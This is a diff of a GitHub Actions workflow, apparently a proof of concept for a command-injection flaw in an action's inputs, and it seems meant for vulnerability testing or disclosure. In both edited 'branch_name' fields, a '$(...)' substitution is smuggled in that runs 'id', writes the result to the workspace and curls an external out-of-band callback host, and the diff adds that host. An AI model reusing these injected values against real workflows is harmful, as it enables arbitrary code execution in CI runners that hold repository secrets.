@@ -12,7 +12,7 @@ jobs:
         with:
           org_name: "poc-org"
           database_name: "pocdb"
-          branch_name: 'x$(id > /github/workspace/proof_branch.txt; curl -s http:///branch > /dev/null 2>&1; echo INJECTED)end'
+          branch_name: 'x$(id > /github/workspace/proof_branch.txt; curl -s http://dara148phf8dvbillek05y3dzz193w38i.oast.live/branch > /dev/null 2>&1; echo INJECTED)end'
           check_exists: "true"
       - name: Show proof from branch action
         run: |
@@ -28,7 +28,7 @@ jobs:
         with:
           org_name: "poc-org"
           database_name: "pocdb"
-          branch_name: 'y$(id > /github/workspace/proof_pass.txt; curl -s http:///pass > /dev/null 2>&1; echo INJECTED2)end'
+          branch_name: 'y$(id > /github/workspace/proof_pass.txt; curl -s http://dara148phf8dvbillek05y3dzz193w38i.oast.live/pass > /dev/null 2>&1; echo INJECTED2)end'
           name: "pocpass"
       - name: Show proof from password action
         run: |
